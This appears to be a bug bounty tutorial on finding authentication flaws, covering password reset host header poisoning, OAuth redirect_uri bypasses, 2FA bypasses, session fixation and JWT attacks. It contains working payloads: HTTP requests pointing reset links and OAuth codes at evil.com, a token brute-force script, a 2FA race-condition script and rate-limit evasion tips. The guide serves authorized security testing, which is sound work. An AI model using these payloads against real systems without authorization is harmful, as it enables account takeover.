---
layout: "@layouts/MarkdownLayout.astro"
title: "Hunting Authentication Vulnerabilities in Bug Bounty Programs"
description: "Systematic methods for finding authentication flaws - password reset poisoning, OAuth misconfigurations, 2FA bypasses, and session management bugs."
date: "2026-04-07"
---

Authentication is not a single check. It is a collection of workflows - registration, login, password reset, OAuth, two-factor authentication, session management - and every one of them has its own failure modes. I have seen programs where the login endpoint was rock solid, but the password reset flow handed over account access to anyone who could manipulate an HTTP header. The payout was $5,000 because the triager understood that authentication bypass equals full account takeover.

This is what makes auth testing so valuable for bounty hunters. A single flaw in any authentication workflow often leads to a critical severity rating. You are not just leaking data, you are taking over accounts. Programs pay accordingly.

The approach I use is to treat each auth workflow as a separate attack surface. Map all of them first, then test each one methodically. Most hunters focus on login and ignore everything else. That is where the opportunity is.

## Mapping the authentication surface

Before you start testing, you need to know what exists. Open Burp Suite, walk through every auth-related feature in the application, and catalog what you find. Here is what I look for:

- Registration flow (email, phone, social login options)
- Login flow (credentials, magic links, SSO)
- Password reset flow (email-based, SMS-based, security questions)
- OAuth/OIDC integrations (Google, GitHub, Facebook, Apple, etc.)
- Two-factor authentication (TOTP, SMS, backup codes, hardware keys)
- Session management (cookies, tokens, refresh tokens, remember-me)
- Account linking (connecting multiple auth providers to one account)
- API authentication (API keys, bearer tokens, JWT)
- Account recovery or deactivation flows

Spend 30 minutes just clicking through these features as a normal user. Watch the proxy history. You will spot interesting behavior before you even start testing - endpoints that accept unexpected parameters, tokens that look predictable, redirects that seem too permissive.

## Password reset flows

Password reset is, in my experience, the single most fruitful area for authentication bugs. The flow involves generating secrets, transmitting them over insecure channels, and trusting user input at multiple points. Developers get this wrong constantly.

### Host header poisoning

This is one of the highest-impact, most commonly found authentication bugs in bounty programs. Here is how it works.

When you request a password reset, the application sends an email containing a reset link. That link includes the application's hostname. Many applications build that hostname from the `Host` header in your HTTP request rather than from a hardcoded configuration value.

```http
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

If the application uses the Host header to construct the reset URL, the victim receives an email with a link like:

```
https://evil.com/reset-password?token=a8f4e2b1c9d7...
```

When the victim clicks that link, their reset token gets sent to the attacker's server. Game over.

Some applications validate the Host header but accept override headers. Try these:

```http
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
X-Forwarded-For: evil.com
X-Original-URL: https://evil.com/reset-password
X-Rewrite-URL: https://evil.com/reset-password
Forwarded: host=evil.com

email=victim@example.com
```

I also test with a double Host header. Some proxies and frameworks handle this differently:

```http
POST /forgot-password HTTP/1.1
Host: target.com
Host: evil.com
```

And subdomain variations, since some validation only checks that the Host ends with the right domain:

```http
Host: evil.target.com
Host: target.com.evil.com
Host: target.com@evil.com
```

### Token predictability

Capture several password reset tokens and analyze them. Are they truly random, or do they follow a pattern? I have seen applications use:

- Sequential numbers with a simple hash
- Timestamps encoded in base64
- MD5 of the user's email address concatenated with the current time
- Short numeric codes (6 digits) with no rate limiting

For the timestamp case, if you know approximately when the reset was requested, you can brute-force the token. Request a reset for your own account, note the token, then request one for the target. If the tokens share a pattern based on time, you can predict the target's token.

```python
import hashlib
import time

# If tokens are MD5(email + unix_timestamp)
target_email = "victim@example.com"
approx_time = int(time.time())

for offset in range(-30, 31):
    candidate = hashlib.md5(
        f"{target_email}{approx_time + offset}".encode()
    ).hexdigest()
    print(f"Trying token: {candidate}")
```

Even if the token is random, check whether it expires. Some applications issue tokens that never expire, which means any leaked token from months ago still works.

### Race conditions on reset

Some applications allow only one active reset token at a time. When you request a new reset, the old token is invalidated. But what if you send multiple reset requests simultaneously?

```http
# Send 50 simultaneous requests
POST /forgot-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

If the token generation is not atomic, you might end up with multiple valid tokens for the same account. Or you might find that the token from request #1 and the token from request #50 are identical, which tells you something about the randomness (or lack of it) in the generation process.

### Token leakage through referrer

After a password reset link is clicked, if the reset page loads any external resources (analytics scripts, CDN assets, social widgets), the full URL including the token may leak in the `Referer` header to those third parties. Check the page source for external resource loads and monitor the network tab.

## OAuth and OIDC misconfigurations

OAuth bugs are high-severity and surprisingly common. The [OAuth 2.0 spec (RFC 6749)](https://datatracker.ietf.org/doc/html/rfc6749) is complicated enough that most implementations get something wrong. [PortSwigger's OAuth labs](https://portswigger.net/web-security/oauth) are worth completing before you start testing real targets.

### Open redirect in redirect_uri

The `redirect_uri` parameter tells the OAuth provider where to send the authorization code after the user authenticates. If the application does not strictly validate this parameter, an attacker can redirect the code to their own server.

```
https://accounts.google.com/o/oauth2/auth?
  client_id=TARGET_CLIENT_ID&
  redirect_uri=https://evil.com/callback&
  response_type=code&
  scope=openid%20email
```

Strict redirect URI validation is required by the spec, but many implementations use loose matching. Try these bypass patterns:

```
# Subdomain variations
redirect_uri=https://evil.target.com/callback
redirect_uri=https://target.com.evil.com/callback

# Path traversal
redirect_uri=https://target.com/callback/../../../evil.com
redirect_uri=https://target.com/callback/..%2f..%2f..%2fevil.com

# Parameter pollution
redirect_uri=https://target.com/callback&redirect_uri=https://evil.com/callback

# Fragment and query tricks
redirect_uri=https://target.com/callback%23@evil.com
redirect_uri=https://target.com/callback?next=https://evil.com

# Localhost or IP variations (for development leftovers)
redirect_uri=http://localhost:8080/callback
redirect_uri=http://127.0.0.1/callback
```

If you find an open redirect anywhere on the target domain, you can chain it. Even if `redirect_uri` must point to `target.com`, you redirect from there to your server:

```
redirect_uri=https://target.com/go?url=https://evil.com/steal-token
```

### Stealing tokens via response_type manipulation

The OAuth `response_type` parameter controls how the token is delivered. `code` sends it as a query parameter (safer). `token` sends it as a URL fragment. Some authorization servers accept both even when the client only registered for one.

If you can switch `response_type=code` to `response_type=token`, the access token appears in the URL fragment. Combined with any open redirect on the target domain, you can leak that token. Fragments are not sent to the server in HTTP requests, but JavaScript on the redirect destination page can read them.

### CSRF on OAuth linking

When an application lets you link an OAuth provider to your existing account (e.g., "Connect your GitHub account"), the linking flow often requires an OAuth authorization. If the final step of that flow - where the OAuth code is exchanged and the provider is linked - lacks CSRF protection, an attacker can link their own OAuth provider to the victim's account.

```http
# Attacker starts OAuth flow, gets an authorization code, but doesn't use it
# Instead, sends the victim a page that submits:
GET /oauth/callback?code=ATTACKER_AUTH_CODE&state= HTTP/1.1
Cookie: session=VICTIM_SESSION
```

The victim's account is now linked to the attacker's Google/GitHub/Facebook account. The attacker logs in via OAuth and takes over the account.

The fix is a `state` parameter with a CSRF token, but I frequently find applications where `state` is either missing or not validated. Always test this.

### Scope escalation

Request more OAuth scopes than the application normally asks for. Add `scope=admin` or `scope=read+write+delete` to the authorization URL and see if the provider grants them. Some providers display a consent screen with the elevated permissions, while others grant them silently if the application has been pre-authorized.

## 2FA bypass techniques

Two-factor authentication is supposed to be the strongest defense against account takeover. But the implementation is often bolted on as an afterthought, and the bypass techniques are straightforward once you know where to look.

### Direct navigation past the 2FA step

The simplest bypass. After entering your username and password, the application redirects you to a 2FA page. But what if you just navigate directly to the dashboard URL?

```http
# After submitting valid credentials, instead of going to /2fa-verify,
# try accessing the authenticated area directly
GET /dashboard HTTP/1.1
Cookie: session=post_password_session_token
```

If the application sets a fully authenticated session after the password check and only uses client-side routing to show the 2FA page, you skip 2FA entirely. I have found this on multiple production applications.

Some applications use a two-phase session - a partial session after password, a full session after 2FA. In that case, test whether the partial session grants access to any authenticated endpoints. Sometimes the password reset endpoint, account settings, or API endpoints accept the partial session.

### Backup code brute-forcing

Backup codes are typically 8-digit numeric codes, giving a keyspace of 100 million. But many applications generate only 10 backup codes and do not rate-limit attempts against them. With no rate limiting, you can cycle through common backup code formats quickly.

```http
POST /2fa/verify HTTP/1.1
Content-Type: application/json
Cookie: session=partial_session

{"code": "12345678", "type": "backup"}
```

Even if individual requests are rate-limited, try these bypasses:

- Add `X-Forwarded-For` headers with different IPs to reset per-IP rate limits
- Use different capitalization or encoding of the endpoint path
- Send requests from multiple source IPs if you have them
- Check if the rate limit resets when you request a new 2FA challenge

### Race conditions on 2FA verification

If the 2FA verification endpoint is vulnerable to race conditions, send the same valid code multiple times simultaneously. Sometimes you can use a single code multiple times, or the rate-limit counter fails to increment properly under concurrent requests.

```python
import asyncio
import aiohttp

async def try_code(session, code):
    async with session.post(
        "https://target.com/2fa/verify",
        json={"code": code},
        cookies={"session": "partial_token"}
    ) as resp:
        return await resp.text()

async def main():
    async with aiohttp.ClientSession() as session:
        # Send 20 requests with the same code simultaneously
        tasks = [try_code(session, "123456") for _ in range(20)]
        results = await asyncio.gather(*tasks)
```

### Response manipulation

Some applications check 2FA on the server but rely on the client-side response to decide what to show. Intercept the response to a failed 2FA attempt and change it:

```http
# Original failed response
HTTP/1.1 200 OK
{"success": false, "error": "Invalid code"}

# Modified response
HTTP/1.1 200 OK
{"success": true}
```

If the application's JavaScript trusts this response and redirects to the dashboard, test whether the server actually grants a full session. Sometimes the front-end and back-end are out of sync, and the server does issue a full session token even when 2FA fails.

### SMS-based 2FA weaknesses

SMS 2FA has additional attack surface. The code is typically 4-6 digits. Without rate limiting, brute-forcing 999,999 possibilities is trivial. Beyond brute-force:

- SIM swapping (out of scope for bug bounties, but demonstrates why SMS 2FA is weak)
- The SMS verification endpoint might accept codes sent to different phone numbers
- Requesting multiple codes might reveal a pattern in code generation
- The code might not expire after a failed attempt or after a new code is requested

## Session management

Session handling is where authentication bugs live after the user has already logged in. These vulnerabilities are often overlooked because hunters focus on the login flow and forget about what happens afterward.

### Session fixation

If the application accepts a session identifier from the user before authentication and keeps using it after authentication, that is session fixation. The attack:

1. Attacker visits the site and obtains a valid unauthenticated session token
2. Attacker tricks the victim into using that session token (via a crafted link, cookie injection, etc.)
3. Victim logs in, and the application upgrades the attacker's session to an authenticated one
4. Attacker uses the same session token to access the victim's account

Test this by noting your session cookie before login. Log in and check whether the session cookie changed. If it stayed the same, the application is vulnerable.

```http
# Before login
Cookie: session=abc123

# After login - this should be a DIFFERENT value
Cookie: session=abc123  # VULNERABLE - same session ID
```

### Token leakage in URLs

If session tokens or API keys appear in URL query parameters, they leak through browser history, server access logs, proxy logs, and the `Referer` header. Check whether any authenticated requests include tokens in the URL rather than in cookies or Authorization headers.

### Improper session invalidation

When a user logs out, changes their password, or enables 2FA, all existing sessions should be invalidated. Test this:

1. Log in on Browser A. Copy the session cookie.
2. Log in on Browser B (same account).
3. On Browser B, change the password or log out.
4. On Browser A, refresh the page using the old session cookie.

If the old session still works after a password change, that is a vulnerability. An attacker who obtained a session token through any means (XSS, network sniffing, log access) retains access even after the user realizes something is wrong and changes their password.

Also test whether "log out of all devices" actually invalidates all sessions, and whether revoking an OAuth application's access actually revokes the associated tokens.

### JWT implementation flaws

If the application uses JWTs for session management, there are specific attacks to test:

```http
# Change the algorithm to "none"
# Original header: {"alg": "HS256", "typ": "JWT"}
# Modified header: {"alg": "none", "typ": "JWT"}
# Then remove the signature

# Algorithm confusion: switch from RS256 to HS256
# If the server uses a public RSA key to verify, and you switch to HS256,
# the server might use the public key as the HMAC secret
```

Check for the `none` algorithm, algorithm confusion attacks, weak signing keys, missing expiration claims, and whether the server validates the signature at all. Tools like `jwt_tool` automate most of these checks.

### Cookie security flags

Check whether session cookies have proper security attributes:

- `Secure` flag: cookie only sent over HTTPS. Without it, session tokens leak on HTTP connections.
- `HttpOnly` flag: cookie not accessible to JavaScript. Without it, XSS leads directly to session hijacking.
- `SameSite` attribute: controls when cookies are sent with cross-origin requests. Without it, CSRF attacks become easier.
- Reasonable expiration: persistent sessions that last months increase the window for token theft.

These are often reported as informational, but missing `Secure` on a session cookie when the site supports HTTP is a real vulnerability. An attacker on the same network can downgrade the connection and steal the cookie.

## Chaining authentication bugs

Authentication vulnerabilities become far more interesting when chained. Some examples I have seen pay out well:

- Open redirect on the target domain + OAuth redirect_uri bypass = full account takeover via stolen authorization code
- Password reset token in URL + referrer leakage to analytics script = account takeover for anyone who clicks the reset link
- CSRF on OAuth linking + attacker's OAuth code = attacker links their identity provider to victim's account
- Session fixation + self-XSS = attacker fixes a session, injects JavaScript, victim logs in and the XSS fires in their authenticated context

When you find a lower-severity auth issue, think about what you can chain it with. A self-XSS alone might be N/A. Combined with session fixation, it becomes high severity.

## Reporting authentication vulnerabilities

Authentication bugs demand clear impact statements. The triager needs to understand exactly what an attacker gains.

Bad: "The password reset is vulnerable to host header injection."

Good: "An attacker can take over any user account by requesting a password reset for the victim's email address with a modified Host header. The victim receives a legitimate-looking reset email, but the link points to the attacker's server, leaking the reset token. No user interaction beyond clicking the reset link is required."

Always demonstrate full account takeover in your proof of concept when possible. Do not stop at showing the token was leaked. Show that you used the token to reset the password and log in as the victim. Frame the [CVSS score](/learn/understanding-cvss-scoring-for-bounty-hunters) accordingly - authentication bypass usually hits 8.0 or higher.

If the target has an [API](/learn/api-security-testing-for-bug-bounties) that shares authentication with the web app, test both surfaces. A 2FA bypass that only works on the API is still a valid finding if the API provides full account access. Document exactly which [access controls](/learn/idor-and-broken-access-control-hunting) are bypassed once authentication is broken. And make your [report](/learn/writing-your-first-report) reproducible in under five minutes.

## Resources

[PortSwigger's authentication labs](https://portswigger.net/web-security/authentication) are the best free practice environment for everything covered here. Work through the password reset, OAuth, and multi-factor authentication sections.

The [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html) explains the defensive side. Reading it tells you exactly where developers need to add checks, which tells you exactly where they forget to.

The [OAuth 2.0 specification (RFC 6749)](https://datatracker.ietf.org/doc/html/rfc6749) is dense but worth reading, especially sections 4.1 (authorization code flow) and 10 (security considerations). Knowing the spec helps you spot when an implementation deviates from it.

Authentication testing rewards patience and thoroughness. Most hunters test the login form and move on. The ones earning consistent payouts are testing every password reset header, every OAuth parameter, every 2FA edge case, and every session cookie flag. The attack surface is wide, the bugs are high severity, and the payouts reflect it.
